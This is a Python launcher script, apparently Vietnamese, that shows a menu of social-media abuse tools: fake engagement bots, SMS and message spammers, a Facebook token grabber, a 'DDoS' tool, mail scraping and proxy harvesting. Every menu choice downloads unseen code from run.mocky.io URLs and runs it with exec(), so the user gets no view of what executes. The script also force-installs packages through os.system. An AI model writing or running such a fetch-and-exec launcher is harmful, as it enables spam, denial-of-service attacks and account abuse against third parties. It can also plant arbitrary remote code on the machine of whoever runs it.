# Hello World.
# If You Correct These Lines You Will Be A Dog!
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
import os, sys
try:
  from faker import Faker
  from requests import session
  from colorama import Fore, Style
  import requests, random, re
  from random import randint
  import requests,pystyle
  import socks
except:
  os.system("pip install faker")
  os.system("pip install requests")
  os.system("pip install colorama")
  os.system('pip install requests && pip install bs4 && pip install pystyle')
  os.system("pip3 install requests pysocks")
  print('__Vui Lòng Chạy Lại Tool__')
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
dev="\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"
def banner():
 banner = f"""\033[1;32m
\033[1;35m██╗  ██╗██╗   ██╗██╗   ██╗██╗  ██╗ ██████╗  █████╗ ███╗   ██╗ ██████╗   
\033[1;37m██║  ██║██║   ██║╚██╗ ██╔╝██║  ██║██╔═══██╗██╔══██╗████╗  ██║██╔════╝     
\033[1;35m███████║██║   ██║ ╚████╔╝ ███████║██║   ██║███████║██╔██╗ ██║██║  ███╗    
\033[1;37m██╔══██║██║   ██║  ╚██╔╝  ██╔══██║██║   ██║██╔══██║██║╚██╗██║██║   ██║
\033[1;35m██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║██║ ╚████║╚██████╔
\033[1;37m╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
\033[1;37mZalo Support: https://zalo.me/g/hbfjnm403
\033[1;37mAll thông tin : huyhoang-coder.neocities.org
"""

 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
banner()
os.system("cls" if os.name == "nt" else "clear")

while True:
	os.system('clear')
	banner()
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;32m║   \033[1;39mTRAO DOI SUB    \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m1.1\033[1;31m] \033[1;32mTOOL TDS PROFILE          ")
	print("\033[1;31m[\033[1;39m2.1\033[1;31m] \033[1;32mTOOL TDS COOKIE               ")
	print("\033[1;31m[\033[1;39m3.1\033[1;31m] \033[1;32mTOOL TIKTOK          ")
	print("\033[1;31m[\033[1;39m4.1\033[1;31m] \033[1;32mTOOL INSTAGRAM ")
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;32m║   \033[1;39mTOOL Mail       \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m5.1\033[1;31m] \033[1;32mCheck Valid Mail ")
	print("\033[1;31m[\033[1;39m6.1\033[1;31m] \033[1;32mĐào Mail ")
	print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
	print("\033[1;39m┌───────────────────┐")
	print("\033[1;32m║  \033[1;39m   TTC \033[1;31m[\033[1;33mNEW\033[1;31m]     \033[1;32m║")
	print("\033[1;39m└───────────────────┘")
	print("\033[1;31m[\033[1;39m7.1\033[1;31m] \033[1;32mTOOL Vipig ")
	print("\033[1;31m[\033[1;39m8.1\033[1;31m] \033[1;32mTOOL TTC TOKEN \033[1;31m[\033[1;33mBảo Trì\033[1;31m]  ")
	print("\033[1;31m[\033[1;39m9.1\033[1;31m] \033[1;32mTOOL TTC PROFILE")
	print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
	print("\033[1;39m┌───────────────────┐          ")
	print("\033[1;32m║  \033[1;39m     TOOLS       \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m10\033[1;31m] \033[1;32mTOOL SPAM MESSAGE ")
	print("\033[1;31m[\033[1;39m11\033[1;31m] \033[1;32mTOOL GET TOKEN FB ")
	print("\033[1;31m[\033[1;39m12\033[1;31m] \033[1;32mTOOL REG PAGE VỊ TRÍ ")
	print("\033[1;31m[\033[1;39m13\033[1;31m] \033[1;32mTOOL Encode ")
	print("\033[1;31m[\033[1;39m14\033[1;31m] \033[1;32mTOOL DDOS (Thử Nghiệm) ")
	print("\033[1;31m[\033[1;39m15\033[1;31m] \033[1;32mTOOL SPAM SMS \033[1;31m[\033[1;33mV1\033[1;31m] ")
	print("\033[1;31m[\033[1;39m16\033[1;31m] \033[1;32mTOOL SPAM SMS \033[1;31m[\033[1;33mV2\033[1;31m] ")
	print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
	print("\033[1;39m┌───────────────────┐")
	print("\033[1;32m║  \033[1;39m    PROFILE      \033[1;32m║")
	print("\033[1;39m└───────────────────┘")
	print("\033[1;31m[\033[1;39m17\033[1;31m] \033[1;32mTOOL BUFF VIEW STORY MAX SPEED PROFILE ")
	print("\033[1;31m[\033[1;39m18\033[1;31m] \033[1;32mTOOL REG PAGE PROFILE+UP AVT ")
	print("\033[1;31m[\033[1;39m19\033[1;31m] \033[1;32mTOOL GET TOKEN PROFILE ")
	print("\033[1;31m[\033[1;39m20\033[1;31m] \033[1;32mTOOL MENBER GROUP PROFILE \033[1;31m[\033[1;33mNEW\033[1;31m]  ")
	print("\033[1;31m[\033[1;39m21\033[1;31m] \033[1;32mTOOL SHARE ẢO PROFILE \033[1;31m[\033[1;39mMAX SPEED\033[1;31m] ")
	print("\033[1;39m┌───────────────────┐")
	print("\033[1;32m║  \033[1;39m    TOOL PROXY   \033[1;32m║")
	print("\033[1;39m└───────────────────┘")
	print("\033[1;31m[\033[1;39m22\033[1;31m] \033[1;32mTOOL ĐÀO PROXY ")
	print("\033[1;31m[\033[1;39m23\033[1;31m] \033[1;32mTOOL LỌC LIVE PROXY ")
	print("\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ")
	chon = input('\033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> \033[1;39m[\033[1;32mCHOSE\033[1;39m]\033[1;39m: \033[1;32m')
	print('\033[1;39m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = ')
	if chon == '1.1' :
		exec(requests.get('https://run.mocky.io/v3/e66e0a5f-008d-45bc-add0-4e5400315491').text)
	if chon == '2.1':
		exec(requests.get('https://run.mocky.io/v3/0a0a25a2-2985-4d85-afe9-e49d50e51f1a').text)
	if chon == '3.1' :
		exec(requests.get('https://run.mocky.io/v3/d6322f1e-0713-42dc-bbc4-c58565b444d0').text)
	if chon == '4.1' :
		exec(requests.get('https://run.mocky.io/v3/ecd4e511-5015-4f72-8ccf-58d561a3667c').text)
	if chon == '5.1' :
		exec(requests.get('https://run.mocky.io/v3/e15cac70-3344-4ec1-8241-c7123592a8f2').text)
	if chon == '6.1':
		exec(requests.get('https://run.mocky.io/v3/a57d7ecf-f725-4b80-a71e-4c4eb254545b').text)
	if chon == '7.1' :
		exec(requests.get('https://run.mocky.io/v3/6ffc1905-737a-4c7b-9ada-e849cee82f90').text)
	if chon == '9.1' :
		exec(requests.get('https://run.mocky.io/v3/dd7f9ccd-d9b8-4853-b327-83188a2c4e95').text)
	if chon == '10':
		exec(requests.get('https://run.mocky.io/v3/7abb6eb7-df9c-4c22-b077-5e886fe1e16a').text)
	if chon == '11' :
		exec(requests.get('https://run.mocky.io/v3/d38cfa2b-28ab-44ff-8ede-813898ff941f').text)
	if chon == '12' :
		exec(requests.get('https://run.mocky.io/v3/91bcc211-369d-4c2c-9e89-650e1e9271ad').text)
	if chon == '13':
		exec(requests.get('https://run.mocky.io/v3/98d7a8d7-16b4-40cd-bf3c-e90d01aab131').text) 
	if chon == '14':
		exec(requests.get('https://run.mocky.io/v3/4f03274c-9d5f-42fa-aaf4-78183a2fcfe3').text) 
	if chon == '15':
		exec(requests.get('https://run.mocky.io/v3/3b1ab121-1229-4234-ae43-db64bb58cc8a').text) 
	if chon == '16':
		exec(requests.get('https://run.mocky.io/v3/b3608eb6-68d6-49c3-8e15-68183424819d').text)
	if chon == '17' :
		exec(requests.get('https://run.mocky.io/v3/1056cf19-14fc-4096-b636-94f45c7c6c95').text)
	if chon == '18' :
		exec(requests.get('https://run.mocky.io/v3/04f637bf-9c2a-4402-bf4e-4c28b53776cc').text)
	if chon == '19' :
		exec(requests.get('https://run.mocky.io/v3/251b95a8-b581-494f-9c0c-8edc4b72b83a').text)
	if chon == '20' :
		exec(requests.get('https://run.mocky.io/v3/165f7e3a-4593-4b29-a8e9-3e308b5978b2').text)
	if chon == '21' :
		exec(requests.get('https://run.mocky.io/v3/eaedce18-b5bf-4f3e-8d5f-b6bc07ac93c2').text)
	if chon == '00' :	
		exec(requests.get('https://run.mocky.io/v3/58baacf5-35e5-4df5-93b4-5da5a639e344').text)
	if chon == '22' :
		exec(requests.get('https://run.mocky.io/v3/64af82d6-fbc2-47ad-ae54-3c4bf7f02f68').text)
	if chon == '23' :
		exec(requests.get('https://run.mocky.io/v3/d2652310-edee-484e-b4b5-9d89bdad94b7').text)	
	else :
		sys.exit("Tool đang được bảo trì hoặc sai sự lựa chọn hãy thử lại")